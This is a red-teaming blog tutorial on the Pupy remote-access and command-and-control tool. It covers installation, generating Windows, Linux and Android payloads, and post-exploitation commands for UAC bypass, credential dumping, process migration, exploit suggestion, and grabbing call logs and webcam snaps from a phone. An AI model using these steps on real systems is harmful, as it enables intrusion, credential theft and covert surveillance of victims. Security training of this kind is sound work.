<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Command &amp; Control Tool: Pupy</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-control-tool-pupy/" rel="bookmark"><time class="entry-date published" datetime="2019-03-19T10:12:12+00:00">March 19, 2019</time><time class="updated" datetime="2025-05-13T10:56:18+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn to exploit Windows, Linux and Android with pupy command and control tool.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction</span></li>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Windows Exploitation</span></li>
<li><span style="color: #000000;">Windows Post Exploitation</span></li>
<li><span style="color: #000000;">Linux Exploitation</span></li>
<li><span style="color: #000000;">Linux Post Exploitation</span></li>
<li><span style="color: #000000;">Android Exploitation</span></li>
<li><span style="color: #000000;">Android Post Exploitation</span></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">Pupy is a cross-platform, post-exploitation tool as well as a multi-function RAT. It’s written in python which makes it very convenient. It also has low detectability that’s why it’s a great tool for the red team.  Pupy can communicate using multiple kinds of transport, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory.</span></p>
<p><span style="color: #000000;">Pupy uses a reflected DLL to load python interpreter from memory which is great as nothing will be shown in the disk. It doesn’t have any special dependencies. It can also migrate into other processes. The communication protocols of pupy are modular and stackable. It can execute non-interactive commands on multiple hosts at once. All the interactive shells can be accessed remotely.</span></p>
<h3><span style="color: #800000;">Installation </span></h3>
<p><span style="color: #000000;">To install pupy execute the following commands one by one :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/n1nj4sec/pupy
ls
./install.sh</pre>
<p><img fetchpriority="high" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-YnExP_TyVQY/XJCzyYcfEhI/AAAAAAAAAeU/XUYvAdTuLu0jwFMCSSQjdbNz6qUF_H1eQCEwYBhgL/s1600/1.png" alt="Pupy Command and Control Tool" width="824" height="812"/></p>
<p><span style="color: #000000;">Now download all the requirements using pip like the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd pupy
pip install -r requirements.txt</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-Uq_0ephMlWs/XJCz1F7KQmI/AAAAAAAAAek/GZqUeqiYB-8rGVcScykwUExpwfY-PV58QCEwYBhgL/s1600/2.png"/></p>
<p><span style="color: #000000;">Now run pupy using the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pupysh.py</pre>
<p><span style="color: #000000;">This command will open the prompt where you will get your session.</span></p>
<p><img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-GeshlpHB7HQ/XJCz3iP5_NI/AAAAAAAAAeY/_TtaCMsnB04BkSEMvAjhMwFmVP9wQLWWgCEwYBhgL/s1600/3.png" alt="Pupy Command and Control Tool" width="651" height="457"/></p>
<p><span style="color: #000000;">Now, to create our payload we will use the pupygen. Use the following help command to see all the attributes which we can use :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pupygen.py -h</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/--xoF1fxAwU8/XJCz3tNA-FI/AAAAAAAAAec/LAfSOXQw3EUbh7GcAYLyqc-d0ka6KI6WwCEwYBhgL/s1600/4.png"/></p>
<h3><span style="color: #800000;"><strong>Windows Exploitation</strong></span></h3>
<p><span style="color: #000000;">Now we will create a windows payload in order to exploit windows with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pupygen.py -O windows -A x86 -o /root/Desktop/shell.exe</pre>
<p><span style="color: #000000;">Here,</span></p>
<p><span style="color: #000000;"><strong>-O:</strong> refers to the operating system</span></p>
<p><span style="color: #000000;"><strong>-A:</strong> refers to the architecture</span></p>
<p><span style="color: #000000;"><strong>-o:</strong> refers to the output file path</span></p>
<p><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-ozK0TALS5o8/XJCz39AbtmI/AAAAAAAAAek/5rmJyZRhhcA1DaDodjcmuaOEc73v5gp_wCEwYBhgL/s1600/5.png" alt="Pupy Command and Control Tool" width="1076" height="381"/></p>
<p><span style="color: #000000;">When you are successful in executing the shell.exe in the victims’ PC, you will have your session as shown in the image :</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-wp3m0MblVt0/XJCz4H-EsUI/AAAAAAAAAec/V-GoC_5k-kYljVUyNoP5xb89DzGovSqegCEwYBhgL/s1600/6.png"/></p>
<h3><span style="color: #800000;"><strong>Windows Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">Further, there are a number of post-exploits you can use, they are pretty simple to use. Some of them we have shown in our article. For message dialogue box to pop up on the target machine you can use the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msgbox –-title hack "you have been hacked"</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-9DPvDsKK_I0/XJCz4TcWDgI/AAAAAAAAAek/Hs7QxX9lvnEwJnUiL7jnomE_A_jfMHMCACEwYBhgL/s1600/7.png" alt="Pupy Command and Control Tool" width="482" height="259"/></p>
<p><span style="color: #000000;">As per the command, following dialogue box will open on the target machine :</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-bvARH1g2DYg/XJCz4iyiYlI/AAAAAAAAAeg/l8EYUijiH9g_zhIaLKAvGdAulj85irTlACEwYBhgL/s1600/8.png"/></p>
<p><span style="color: #000000;">You can also access the desktop using the remote desktop module with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rdesktop -r 0</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-uwf8ib3ftOc/XJCz5PqXZmI/AAAAAAAAAek/ZNXzgT5AMYA0Bt7DnNvDTeF3AIpHP_zhQCEwYBhgL/s1600/9.png"/></p>
<p><span style="color: #000000;">After executing the above command you can remotely access the desktop just as shown in the image below :</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-Bc9zOQVAB3g/XJCzykRfy4I/AAAAAAAAAec/HJyssvmCFWog943wsD0IQMPKrk0cF-uyQCEwYBhgL/s1600/10.png" alt="Pupy Command and Control Tool" width="899" height="791"/></p>
<p><span style="color: #000000;">For bypass UAC, we have the simplest command in pupy i.e. the following :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bypassuac -r</pre>
<p><span style="color: #000000;">The above command will recreate a session with admin privileges as shown in the image below :</span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-EZYDyG7ytWU/XJCzyiah2DI/AAAAAAAAAeM/BB-me9Yrdhgp4ErgHAir5TY64KXKBaGTQCEwYBhgL/s1600/11.png"/></p>
<p><span style="color: #000000;">For getting the system’s credentials, you can use the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creddump</pre>
<p><span style="color: #000000;">And as you can see in the image below, you get the information about all the credentials :</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-pixYioj4NBQ/XJCzzBoW9wI/AAAAAAAAAeM/yidaAk65ipkNOzpszlX6baMv6TqKnIYggCEwYBhgL/s1600/12.png" alt="Pupy Command and Control Tool" width="1032" height="685"/></p>
<p><span style="color: #000000;">Using pupy, we can also migrate our session to a particular process. With migrate command, the attributes of the command are shown in the image below :</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-Ots3nCLlHCE/XJCzzXrZ8YI/AAAAAAAAAeM/wXD59FbvHsMaI98Pgii1OOth2L7KdswIwCEwYBhgL/s1600/13.png"/></p>
<p><span style="color: #000000;">With ps command, you can find out the process ID number of all the processes running on the target PC, along with letting you know which process is running. Knowing the process ID is important as it will be required in the migrate command and will help us to migrate our session as we desire.</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-5TDrFfjWByo/XJCzztkPZMI/AAAAAAAAAeY/igSp1VhoFdA3lC87872ms7yv0TR76M30QCEwYBhgL/s1600/14.png"/></p>
<p><span style="color: #000000;">Now, as we know the processes that are running, we can use it to migrate our session. For this, type the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">migrate -p explorer.exe -k</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-tvOa_bdhj3g/XJCz0Lui9LI/AAAAAAAAAec/zX0lUfyIBSQaPSlF3UECtgwkqsrvINbCQCEwYBhgL/s1600/15.png" alt="Pupy Command and Control Tool" width="860" height="453"/></p>
<p><span style="color: #000000;">And then a new session will be created as desired.</span></p>
<h3><span style="color: #800000;"><strong>Linux Exploitation</strong></span></h3>
<p><span style="color: #000000;">To exploit Linux, we will have to generate Linux payload with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pupygen.py -O linux -A x64 -o /root/Desktop.shell</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-biB8zdE_myE/XJCz0GFaRPI/AAAAAAAAAek/5K3je2GjGk8KYicdsw-sWCcpvBezGFA4QCEwYBhgL/s1600/16.png"/></p>
<p><span style="color: #000000;">Once you execute the malicious file in the target system, you will have your session as shown in the image below :</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-g_PT7wkNsA4/XJCz0ZvfACI/AAAAAAAAAeU/_H0twPPTSvwT6W6lJ1VC6YRZ_k9wKt6hgCEwYBhgL/s1600/17.png"/></p>
<p><span style="color: #000000;">As you have a session now, you can check if the target machine is running on a VM or is it a host machine with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">check_vm</pre>
<p><span style="color: #000000;">And as you can see in the image below that the target machine is, in fact, running on VM</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-tf7_KSjj9w0/XJCz0k8uoTI/AAAAAAAAAeU/2-ebDOTj7m8oBC2KMTAhdN45Lh1la31TgCEwYBhgL/s1600/18.png" alt="Pupy Command and Control Tool" width="454" height="183"/></p>
<h3><span style="color: #800000;"><strong>Linux Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">In post-exploitation, you can have detailed information about the target system with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privesc_checker --linenum</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-RqdH6Nv9XHE/XJCz04DWloI/AAAAAAAAAec/4272xmkt9QAZvp34bl-cHrsMGhiqu04PACEwYBhgL/s1600/19.png"/></p>
<p><span style="color: #000000;">With pupy, you can also find out all the exploits that are working on the target system with the help of the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exploit_suggester –shell /bin/bash</pre>
<p><span style="color: #000000;">As you can see that in the image below, it has given us the list of all the exploits to which the target system is vulnerable.</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-pLeWe_ZVeNU/XJCz1cHxKSI/AAAAAAAAAeQ/4GcflFzmjq8HdWdTarq0xMNrolO6ypTegCEwYBhgL/s1600/20.png" alt="Pupy Command and Control Tool" width="896" height="960"/></p>
<p><span style="color: #000000;">To get the basic information about the target system such as IP address, MAC address, etc. you can use the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">get_info</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-Te1lKV_Enlw/XJCz1jh6fJI/AAAAAAAAAeY/3YIVwVdTziUJCcSJD8kUo1aBA716f2dKwCEwYBhgL/s1600/21.png"/></p>
<h3><span style="color: #800000;"><strong>Android Exploitation</strong></span></h3>
<p><span style="color: #000000;">Now we will create an android payload in order to exploit windows with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pupygen.py -O android -o /root/shell.apk</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-5tjem2Lme5E/XJCz1xHJrjI/AAAAAAAAAeQ/qC2gg_C8ZpIb1A8xmSYiPOCHqKLzmHDpwCEwYBhgL/s1600/22.png" alt="Pupy Command and Control Tool" width="768" height="417"/></p>
<p><span style="color: #000000;">When you are successful in installing the shell.apk in the victims’ Android Phone, you will have your session as shown in the image :</span></p>
<p><img decoding="async" src="//3.bp.blogspot.com/-WnXqLV7OPek/XJCz2Ham70I/AAAAAAAAAec/0JDaU71FWf4rUvAWIlxkSnJKyVxEu8mqwCEwYBhgL/s1600/23.png"/></p>
<h3><span style="color: #800000;"><strong>Android Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">In post-exploitation, you can grab the call logs stored on the target device with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">call -a -output-folder /root/call</pre>
<p><span style="color: #000000;">Here,</span></p>
<p><span style="color: #000000;"><strong>-a:</strong> refers to getting all the call details</span></p>
<p><span style="color: #000000;"><strong>-output-folder :</strong> refers to the path of the output file containing the call logs</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-4CYhTx9m4iE/XJCz2mMdOGI/AAAAAAAAAeg/3Jk_OVqR_9MHrav3bcUzV3GZT0uQQaTsACEwYBhgL/s1600/24.png" alt="Pupy Command and Control Tool" width="812" height="291"/></p>
<p><span style="color: #000000;">We will use the cat command on callDetails.txt to read the call logs.</span></p>
<p><img decoding="async" src="//3.bp.blogspot.com/-phU43fGK8Ao/XJCz28ZO7rI/AAAAAAAAAek/9TaadD8t3uozOWvldPBwRdaJBJqJYdA9QCEwYBhgL/s1600/25.png"/></p>
<p><span style="color: #000000;">To get the camera snap from the primary camera on the target device, you can use the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">webcamsnap -v</pre>
<p><span style="color: #000000;">Here,</span></p>
<p><span style="color: #000000;"><strong>-v :</strong> refers to view the image directly</span></p>
<p><span style="color: #000000;">As we can see in the given image that we have the snap captured and stored at the given location.</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-VUKlvXL-nVE/XJCz2-HgmQI/AAAAAAAAAeU/Nex4d8EcE2M-YZoPCvFlArxFZGJXOe-vwCEwYBhgL/s1600/26.png"/></p>
<p><span style="color: #000000;">To get the information about the installed packages or apps on the target device, you can use the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apps -a -d</pre>
<p><span style="color: #000000;">Here,</span></p>
<p><span style="color: #000000;"><strong>-a:</strong> refers to getting all the installed packages details</span></p>
<p><span style="color: #000000;"><strong>-d:</strong> refers to view detailed information</span></p>
<p><span style="color: #000000;">As we can see in the given image that we have detailed information about the packages or apps installed on the target machine.</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-2rM1pdwQ5wo/XJCz3EvW5sI/AAAAAAAAAeU/7IKxz_oh2AU408Et2uU3aeZErp75iKd-ACEwYBhgL/s1600/27.png" alt="Pupy Command and Control Tool" width="780" height="774"/></p>
<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast<strong>. </strong>Contact </span><strong><a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
